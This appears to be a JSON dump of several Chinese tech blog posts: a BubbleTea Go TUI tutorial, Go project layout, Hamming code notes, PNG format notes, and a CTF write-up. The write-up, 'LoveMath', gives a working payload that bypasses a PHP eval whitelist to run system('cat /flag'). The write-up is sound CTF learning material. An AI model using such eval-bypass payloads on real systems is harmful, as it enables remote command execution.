[{"content":"简介 The fun, functional and stateful way to build terminal apps. A Go framework based on The Elm Architecture. Bubble Tea is well-suited for simple and complex terminal applications, either inline, full-window, or a mix of both.\nBubbleTea是一个轻量级的TUI(Terminal User Interface)框架，在其基础上，可以轻松的开发一些好看的命令行工具。\nBubble符合Elm框架(一种函数式的前端框架)的标准。\n基础 首先熟悉一下官方文档中的例子。我们在这里创建了一个简单的选项表，模拟让用户选择不同食物。\n程序入口 func main() { // 此处的initialModel()返回一个Model model := initialModel() p := tea.NewProgram(initialModel()) if _, err := p.Run(); err != nil { fmt.Printf(\u0026#34;Alas, there\u0026#39;s been an error: %v\u0026#34;, err) os.Exit(1) } } 用tea.NewProgram()创建一个program，然后使用p.Run()来启动程序。tea.NewProgram()的参数通常是Model类型。\nModel Model是一个接口，接口定义如下\n// Model contains the program\u0026#39;s state as well as its core functions. type Model interface { Init() Cmd Update(Msg) (Model, Cmd) View() string } 也就是说，只要我们的类型实现了Init(), Update(Msg), View()方法，就可以把其作为Model参数传入tea.NewProgram()中。\n创建一个model结构体，并实现Model接口。\ntype model struct { choices []string cursor int selected map[int]struct{} } // 首先被调用的函数，返回optional // 如果不执行初始命令，则返回 nil。 func (m model) Init() tea.Cmd { return nil } // 收到消息时调用Update()。用它来检查消息 // Update()将更新Model或者执行指令 func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: switch msg.String() { case \u0026#34;ctrl+c\u0026#34;, \u0026#34;q\u0026#34;: return m, tea.Quit case \u0026#34;up\u0026#34;, \u0026#34;k\u0026#34;: if m.cursor \u0026gt; 0 { m.cursor-- } case \u0026#34;down\u0026#34;, \u0026#34;j\u0026#34;: if m.cursor \u0026lt; len(m.choices)-1 { m.cursor++ } case \u0026#34;enter\u0026#34;, \u0026#34; \u0026#34;: _, ok := m.selected[m.cursor] if ok { delete(m.selected, m.cursor) } else { m.selected[m.cursor] = struct{}{} } } } return m, nil } // View()用来渲染UI，每次调用Update()后都会调用View() func (m model) View() string { s := \u0026#34;What should we buy at the market?\\n\\n\u0026#34; for i, choice := range m.choices { cursor := \u0026#34; \u0026#34; if m.cursor == i { cursor = \u0026#34;\u0026gt;\u0026#34; } checked := \u0026#34; \u0026#34; if _, ok := m.selected[i]; ok { checked = \u0026#34;x\u0026#34; } s += fmt.Sprintf(\u0026#34;%s [%s] %s\\n\u0026#34;, cursor, checked, choice) } s += \u0026#34;\\nPress q to quit.\\n\u0026#34; return s } Update()接受的msg可以是任何类型的，通常使用断言进行类型判断，从而对不同类型的msg做处理。在例子中，tea.KeyMsg指的是是键盘输入，里面对应不同的类型做了不同逻辑判断。\nView()是渲染UI的函数，这里通过对m。curosr为的值进行判断，从而显示游标\u0026gt;的位置。\nInitialization函数 实例代码中还提供了一个Initialization函数，用来初始化model中的数据，但是这也不是必须的。我们可以通过很多别的方法创建、编辑model中的值\nfunc initialModel() model { return model{ // Our to-do list is a grocery list choices: []string{\u0026#34;Buy carrots\u0026#34;, \u0026#34;Buy celery\u0026#34;, \u0026#34;Buy kohlrabi\u0026#34;}, // A map which indicates which choices are selected. We\u0026#39;re using // the map like a mathematical set. The keys refer to the indexes // of the `choices` slice, above. selected: make(map[int]struct{}), } } 当然，实例中的TUI过于简陋，实际上BubbleTea开发的TUI都很漂亮。BubbleTea的GitHub页面提供了非常多的实例，供开发者学习。\n进度条(官方用例) 一个渐变色的进度条(animated)，动画过渡平滑\n另一种实现方式(静态的)，每次update才渲染一次。\n实现(animated) 全局变量\nconst ( padding = 2 // 填充长度 maxWidth = 80 // 进度条宽度 ) var helpStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#626262\u0026#34;)).Render // 帮助字段样式 type tickMsg time.Time // msg类型 model定义\n// 引入了\u0026#34;github.com/charmbracelet/bubbles/progress\u0026#34;中的progress这个model type model struct { progress progress.Model } github.com/charmbracelet/bubbles/ 本身也有不少已经实现的model，比如list, progress, spinner, paginator, spinner, table等，可以快速构建一个TUI应用。\nInit函数实现\nfunc (m model) Init() tea.Cmd { return tickCmd() } 这里返回了tickCmd()函数，这个函数定义如下:\nfunc tickCmd() tea.Cmd { return tea.Tick(time.Second*1, func(t time.Time) tea.Msg { return tickMsg(t) }) } 后面的函数作为参数传入，目的只是返回一个time.time类型，这里我其实不理解为什么开发者会把这个函数设计的这么复杂，在tea.Tick的实现中，有大段的话解释，大致内容如下：\nTick产生的定时器独立于系统时间 Tick函数需要传入一个时间间隔和一个函数作为参数。这个函数会返回一个消息，在这个消息中包含了定时器触发的时间 Tick函数只会发送单个消息，并不会自动按照间隔发送多个消息。为了实现定期触发消息，需要在接收到消息后返回另一个 Tick Cmd。 也就是说，这样的写法可以当成固定的组合用法\ntype TickMsg time.Time func doTick() Cmd { return Tick(time.Second, func(t time.Time) Msg { return TickMsg(t) }) } func (m model) Init() Cmd { // Start ticking. return doTick() } func (m model) Update(msg Msg) (Model, Cmd) { switch msg.(type) { case TickMsg: // Return your Tick command again to loop. return m, doTick() } return m, nil } Update函数\nfunc (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: return m, tea.Quit case tea.WindowSizeMsg: m.progress.Width = msg.Width - padding*2 - 4 if m.progress.Width \u0026gt; maxWidth { m.progress.Width = maxWidth } return m, nil case tickMsg: if m.progress.Percent() == 1.0 { return m, tea.Quit } // Note that you can also use progress.Model.SetPercent to set the // percentage value explicitly, too. cmd := m.progress.IncrPercent(0.25) return m, tea.Batch(tickCmd(), cmd) // FrameMsg is sent when the progress bar wants to animate itself case progress.FrameMsg: progressModel, cmd := m.progress.Update(msg) m.progress = progressModel.(progress.Model) return m, cmd default: return m, nil } } 在Update函数中，分别处理了窗口大小事件，点按键盘事件，时间跳动事件等。\nView方法\nfunc (m model) View() string { pad := strings.Repeat(\u0026#34; \u0026#34;, padding) return \u0026#34;\\n\u0026#34; + pad + m.progress.View() + \u0026#34;\\n\\n\u0026#34; + pad + helpStyle(\u0026#34;Press any key to quit\u0026#34;) } 在process的方法的基础上，添加了占位符，添加了帮助信息。\n命令行迷宫 package tui import ( \u0026#34;strings\u0026#34; \u0026#34;vimMaze/maze\u0026#34; tea \u0026#34;github.com/charmbracelet/bubbletea\u0026#34; \u0026#34;github.com/charmbracelet/lipgloss\u0026#34; ) const ( wall = iota path person end key ) // 设置帮助字段样式，砖块样式 var helpStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#626262\u0026#34;)).Render var brickStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#B6482F\u0026#34;)).Render type model struct { Maze maze.Maze } func (m model) Init() tea.Cmd { return nil } func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: switch key := msg.String(); key { case \u0026#34;ctrl+c\u0026#34;: return m, tea.Quit case \u0026#34;j\u0026#34;: m.Maze.GoDown() return m, nil case \u0026#34;k\u0026#34;: m.Maze.GoUp() return m, nil case \u0026#34;h\u0026#34;: m.Maze.Goleft() return m, nil case \u0026#34;l\u0026#34;: m.Maze.Goright() return m, nil } case tea.WindowSizeMsg: m.Maze = maze.GenerateMaze(min(msg.Height, msg.Width)) return m, nil } var cmd tea.Cmd return m, cmd } func (m model) View() string { if m.Maze.Win == true { return \u0026#34;You win!🎉\u0026#34; + \u0026#34;\\n\\n \u0026#34; + helpStyle(\u0026#34;Press ctrl+c to exit\u0026#34;) } var build strings.Builder for _, valueRow := range m.Maze.Map { for _, valuePoint := range valueRow { if valuePoint == wall { build.WriteString(brickStyle(\u0026#34;░░\u0026#34;)) } else if valuePoint == path { build.WriteString(\u0026#34; \u0026#34;) } else if valuePoint == person { build.WriteString(\u0026#34;🧑\u0026#34;) } else if valuePoint == end { build.WriteString(\u0026#34;💰\u0026#34;) } } build.WriteString(\u0026#34;\\n\u0026#34;) } return build.String() } TODO: 为nmap开发一个简单TUI，方便用户定义参数 可能遥遥无期了\n","permalink":"https://fr000g.github.io/post/tech/%E7%94%A8bubbletea%E5%86%99%E4%B8%80%E4%B8%AA%E6%BC%82%E4%BA%AE%E7%9A%84tui%E7%A8%8B%E5%BA%8F/","summary":"简介 The fun, functional and stateful way to build terminal apps. A Go framework based on The Elm Architecture. Bubble Tea is well-suited for simple and complex terminal applications, either inline, full-window, or a mix of both. BubbleTea是一个轻量级的TUI(Terminal User Int","title":"用BubbleTea写一个漂亮的TUI程序"},{"content":"Go项目布局 官方项目组织推荐 官方项目地址\n在官方文档中，没有明确指出什么类型的组件应该被放置什么位置，只是做了一些比较基本的推荐\nBasic package 对于简单的包，使用单个文件封装即可\nproject-root-directory/ ├── go.mod ├── modname.go └── modname_test.go Basic command 对于简单的可执行程序，如果程序不太复杂，也可以用单个的go文件来组织\nproject-root-directory/ ├── go.mod ├── auth.go ├── auth_test.go ├── client.go └── main.go Package or command with supporting packages 稍微复杂一些的包或可执行程序，可以根据功能拆封成不同目录中。而且官方也推荐创建一个internal目录，防止一些开发者不希望暴露的内部方法暴露。\nproject-root-directory/ ├── internal/ │ ├── auth/ │ │ ├── auth.go │ │ └── auth_test.go │ └── hash/ │ ├── hash.go │ └── hash_test.go ├── go.mod ├── modname.go └── modname_test.go Multiple packages 如果一个模块由多个可导入的包组成，则每个包有自己的目录\nproject-root-directory/ ├── go.mod ├── modname.go ├── modname_test.go ├── auth/ │ ├── auth.go │ ├── auth_test.go │ └── token/ │ ├── token.go │ └── token_test.go ├── hash/ │ └── hash.go └── internal/ └── trace/ └── trace.go 有一个例子，就是net这个包的组织方式，所以导入的时候，可以使用如下方式导入\nimport ( \u0026#34;net/http\u0026#34; \u0026#34;net/rpc\u0026#34; ) 类似的，官方还提到了Multiple commands Packages and commands in the same repository Server project等多种布局，推荐阅读查看。\n知名非官方项目规范 最近也看到了一个非官方的项目布局的golang-standards/project-layout的repo，用于大型的复杂项目的文件组织和布局，这里面详细说明了各种组件应该用什么样的方式去组织。\n这些建议，如果按照功能分类，可以按照一下来分：\n应用程序目录 /cmd: 包含项目的主要应用程序。 /internal: 包含私有应用程序和库代码，不希望外部导入。 /pkg: 包含对外公开的库代码。 服务应用程序目录 /api: 包含 OpenAPI/Swagger 规范、JSON 模式文件等。 Web 应用程序目录 /web: 包含 Web 应用程序特定组件，如静态 Web 资产、服务器端模板和单页应用程序。 公共应用程序目录 /configs: 配置文件模板或默认配置。 /init: 系统初始化和进程管理器配置。 /scripts: 执行构建、安装、分析等操作的脚本。 /build: 打包和持续集成配置。 /deployments: IaaS、PaaS、系统和容器编排部署配置和模板。 测试目录 /test: 包含额外的外部测试应用程序和测试数据。 其他目录 /docs: 设计和用户文档。 /tools: 项目的支持工具。 /examples: 应用程序和/或公共库的示例。 /third_party: 外部辅助工具、分叉代码和其他第三方实用程序。 /githooks: Git 钩子。 /assets: 与存储库相关的其他资产（图片、标志等）。 /website: 项目网站数据（如果没有使用 GitHub 页面）。 这个repo还着重强调了，千万不要用/src这种类型的目录，这样可能会导致和go本身的src目录混淆。\n存在的问题 但是这个项目被go的官方人员用不太客气的语气锐评了了\nThere are two problems with this GitHub repo:\nit claims to host Go standards and does not, in the sense that these are in no way official standards the project-layout standard it puts forth is far too complex and not a standard Regarding \u0026ldquo;why not tell us the standard Go project layout and we\u0026rsquo;ll update the doc?\u0026rdquo;, that only addresses point 2. If there really were standards, they would be in the main Go project doc tree. The standard for project layout would also be a lot shorter. I appreciate your trying to provide a useful resource, but calling it \u0026lsquo;golang-standards\u0026rsquo; is claiming more than it is.\nBut for the record, the minimal standard layout for an importable Go repo is really:\nPut a LICENSE file in your root Put a go.mod file in your root Put Go code in your repo, in the root or organized into a directory tree as you see fit That\u0026rsquo;s it. That\u0026rsquo;s the \u0026ldquo;standard\u0026rdquo;.\nIn particular:\nIt is not required to put commands in cmd/. It is not required to put packages in pkg/. It is not required to put web stuff in web/. It is not required to put APIs in api/. It is not required to put web stuff in web/. It is not required to put configurations in configs/. It is not required to put systemd scripts in init/. It is not required to put shell scripts in scripts/. It is not required to put Docker files in build/package/. It is not required to put CI configs in build/ci/. It is not required to put deployment configs in deployments/. It is not required to put test support in test/. It is not required to put documentation in docs/. It is not required to put supporting tools in tools/. It is not required to put examples in examples/. It is not required to put third_party code in third_party/. It is not required to put git hooks in githooks/ It is not required to put static assets in assets/. It is not required to put website data in website/.\nThe importable golang.org/x repos break every one of these \u0026ldquo;rules\u0026rdquo;.\n这段话由Russ Cox在一个issue中提出，大致说了两个事情\n一个项目只要LICENSE，go.mod，还有go的源码就足够了，可以用目录组织go的源代码 这个repo太鸡儿复杂了，不是官方推荐，也不是什么标准 看来go的开发者不太希望大家受到条条框框的限制，希望开发者们以一种灵活资源的方式去开发。\n","permalink":"https://fr000g.github.io/post/tech/go%E9%A1%B9%E7%9B%AE%E5%B8%83%E5%B1%80/","summary":"Go项目布局 官方项目组织推荐 官方项目地址 在官方文档中，没有明确指出什么类型的组件应该被放置什么位置，只是做了一些比较基本的推荐 Basic package 对于简单的","title":"Go项目布局"},{"content":"LoveMath-writeup 前置知识 可变函数 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。\n可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。\n例子 \u0026lt;?php function foo() { echo \u0026#34;In foo()\u0026lt;br /\u0026gt;\\n\u0026#34;; } function bar($arg = \u0026#39;\u0026#39;) { echo \u0026#34;In bar(); argument was \u0026#39;$arg\u0026#39;.\u0026lt;br /\u0026gt;\\n\u0026#34;; } // 使用 echo 的包装函数 function echoit($string) { echo $string; } $func = \u0026#39;foo\u0026#39;; $func(); // This calls foo() $func = \u0026#39;bar\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls bar() $func = \u0026#39;echoit\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls echoit() ?\u0026gt; 这意味着在特定情况下，一次传参的过程中，可以通过?a=($_GET[b])($_GET[c])来执行系统函数，例如：?a=($_GET['b'])($_GET['c']);b=system\u0026amp;c=cat /flag\n​此时，只会对参数a进行检查\n当[]被过滤时，可用{}代替\nbase_convert()函数：在任意进制之间转换数字\n语法\nbase_convert(number,frombase,tobase) 其中，number为原始值，frombase为原进制，tobase为目标进制，支持2-36进制\ndecbin(),dechex(),decoct()等函数，均为进制转换函数\n了解一些php内置的一些math函数，例如上述函数\nhex2bin()函数，将十六进制字符串转换为二进制字符串，可用于做出字符\n题解 题目源码 \u0026lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;太长了不会算\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); } } //帮你算出答案 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } 观察一下原题\n需要绕过三处，传参长度不超过80，绕过$blacklist，只使用$whitelist中的字段\n理想状态下，构造?c=system('cat /flag')但是空格已经被过滤，考虑上文中的?c=$_GET['a']($_GET['b']);a=system\u0026amp;b=cat /flag\n单引号和双引号被过滤，不使用也可以执行，同时，[]可以用{}代替\n在对参数的检查中，只检查变量c，利用已有函数构建payload\n利用hex2bin函数将数字转为字符串\n首先，构造hex2bin函数\nbase_convert(37907361743,36,10) 接着，构建_GET字段\nbase_convert(37907361743,36,10)(dechex(1598506324)) 构建完整payload\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pow}($$pi{log})\u0026amp;pow=system\u0026amp;log=cat /flag ","permalink":"https://fr000g.github.io/post/tech/lovemath-writeup/","summary":"LoveMath-writeup 前置知识 可变函数 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来","title":"LoveMath Writeup"},{"content":"关于海明码编码方式的学习 前言 机组课的海明（汉明）码学的不太行，课本直接不提，老师课件内容和维基百科和各种博客都有些出入，高位低位换来换去的，有些迷糊，重新学习一下（本片以《计算机组成原理》唐朔飞版为主）\n简介 在电信领域中，汉明码（英语：hamming code），也称为海明码，是(7,4)汉明码推广得到的一种线性纠错码，由理查德·卫斯里·汉明于1950年发明。\n用数学术语来说，汉明码是一种二元线性码。对于所有整数 r ≥ 2，存在一个分组长度 n = 2r − 1、k = 2r − r − 1 编码。因此汉明码的码率为 R = k / n = 1 − r / (2r − 1)，对于最小距离为3、分组长度为 2r − 1 的码来说是最高的。汉明码的奇偶检验矩阵的是通过列出所有长度为 r 的非零列向量构成的。\n海明码本质是一种多重奇偶校验码，可检测以为错误\n编码 确定校验位的个数\n2^k^ \u0026gt;= k+n+1\n其中，k为校验位的个数；n为原数据位个数\n确定校验位置：2的幂次数（1，2，4，8……）\n计算校验位\nP1=D3$\\bigoplus$ D5$\\bigoplus$ D7\nP2=D3$\\bigoplus$ D6$\\bigoplus$ D7\nP4=D5$\\bigoplus$ D6$\\bigoplus$ D7\n（直接计1的个数，1的个数为奇数则为1，个数为偶数则为0）\n确定各个校验位的检测位数：\nP1可理解为倒数第一位是1的二进制数，如112(3),1012(5),1112(7)\nP2为倒数第二位是1的二进制数，如112(3),1102(6),1112(7)\nP4位倒数第三位是1的二进制数，如1012(5),1102(6),1112(7)\n通用方法 参见汉明码 - 维基百科，自由的百科全书 (wikipedia.org)\n例 写出1100的海明码\n确定k的位数。n=4，则k=3\n（为了应试，直接记原码与校验码位数关系1-\u0026gt;2；2~4-\u0026gt;3；5~11-\u0026gt;4）\n确定校验码位置，即1，2，4\n计算\nP1=1$\\bigoplus$1$\\bigoplus$0（3，5，7）\nP2=1$\\bigoplus$0$\\bigoplus$0（3，6，7）\nP3=1$\\bigoplus$0$\\bigoplus$0（5，6，7）\n得P1=0 P2=1 P3=1\n则D4=0 D2=1 D1=1\n补全\n位置 D1 D2 D3 D4 D5 D6 D7 值 1 1 1 0 1 0 0 纠错 定义校验位Si\nS1=D1$\\bigoplus$D3$\\bigoplus$ D5$\\bigoplus$ D7\nS2=D2$\\bigoplus$D3$\\bigoplus$ D6$\\bigoplus$ D7\nS3=D4$\\bigoplus$D5$\\bigoplus$ D6$\\bigoplus$ D7\n若S3 S2 S1为000，则无错误；若S3 S2 S1为001，则第一位错误，同理如下\nS3 S2 S1\t000\t001\t010\t011\t100\t101\t110\t111 错误位置\t无\t1\t2\t3\t4\t5\t6\t7 检测出错误位翻转即可\n","permalink":"https://fr000g.github.io/post/tech/hamming/","summary":"关于海明码编码方式的学习 前言 机组课的海明（汉明）码学的不太行，课本直接不提，老师课件内容和维基百科和各种博客都有些出入，高位低位换来换去的，","title":"Hamming"},{"content":"关于PNG文件的学习 文件格式 文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块\n数据块chunk PNG又两种数据块，关键数据块（critical chunk）与辅助数据块（ancillary chunks）。关键数据块定义4各标准数据块，每个PNG文件都不可缺少\n标准数据块为：IHDR(文件头数据块)、IDAT(图象数据块)、EIND(图象结束数据)\n每个数据块由4部分组成\n名称\t字节数\t说明 length\t4\t指定数据长度 chunk type code\t4\t指定数据类型 chunk data\t可变\t数据 CRC\t4\t校验数据 IHDR 在PNG数据流中唯一，内容共13字节。\nWidth: 4 bytes Height: 4 bytes Bit depth: 1 byte Color type: 1 byte Compression method: 1 byte Filter method: 1 byte Interlace method: 1 byte 后面跟4位CRC，CRC由12-29位数据计算得出 CRC 循环冗余校验（Cyclic Redundancy Check， CRC）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种信道编码技术，主要用来检测或校验数据传输或者保存后可能出现的错误。它是利用除法及余数的原理来作错误侦测的。\n常见题目 通过修改图片的高度隐写，可通过CRC校验，还原图片\nEXP:\nimport os import binascii import struct misc = open(\u0026#34;img.png\u0026#34;, \u0026#34;rb\u0026#34;).read() for i in range(1920): data = misc[12:16] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[20:29]#验证宽度 crc32 = binascii.crc32(data) \u0026amp; 0xffffffff if crc32 == 0x37EC2D65:#此处为CRC print(i) 上文中，若验证图片高度，则代码为\ndata = misc[16:20] + struct.pack(\u0026#39;\u0026gt;i\u0026#39;, i) + misc[24:29] ","permalink":"https://fr000g.github.io/post/tech/png-file-format-learning/","summary":"关于PNG文件的学习 文件格式 文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块 数据块chunk PNG又两种数据块，关键数据块（critical c","title":"PNG File Format Learning"}]